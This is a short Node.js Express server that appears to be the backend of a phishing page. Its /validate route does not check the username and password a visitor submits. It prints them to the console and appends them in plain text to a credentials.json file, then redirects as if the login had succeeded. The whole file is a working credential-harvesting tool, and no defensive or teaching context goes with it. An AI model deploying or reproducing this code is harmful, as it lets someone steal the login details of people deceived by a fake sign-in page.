const path = require('path');
const fs = require('fs')
const express = require('express');
const session = require('express-session');
const bodyParser = require('body-parser');
const { exit } = require('process');
const credentialFile = path.join(__dirname, '../output/credentials.json')

async function addJSON(data={}) {
	let jsonFile = fs.readFileSync(credentialFile, { encoding: 'utf-8' })
	let jsonParsed = JSON.parse(jsonFile)
	jsonParsed.push(data)
	let jsonString = JSON.stringify(jsonParsed)
	fs.writeFileSync(credentialFile, jsonString, { encoding: 'utf-8' })
	return jsonString
}

const app = express();

app.use(session({
	secret: 'secret',
	resave: true,
	saveUninitialized: true
}));

app.use(bodyParser.urlencoded({extended : true}));
app.use(bodyParser.json());

app.get('/', function(request, response) {
	response.sendFile(path.join(__dirname, '../public/index.html'));
});

app.post('/validate', function(request, response) {
	var username = request.body.username;
	var password = request.body.password;
	if (username && password) {
		console.log("USR: " + username);
		console.log("PASWD: " + password);
		addJSON({
			usrname: username,
			passwd: password
		})
		response.redirect('/?valid=' + encodeURIComponent('true'))
		response.end();
	} else {
		response.send('Please enter Username and Password!');
		response.redirect('/?valid=' + encodeURIComponent('false'))
		response.end();
	}
});

console.log("Listening on port 8080, URL: http://127.0.0.1:8080");
app.listen(8080);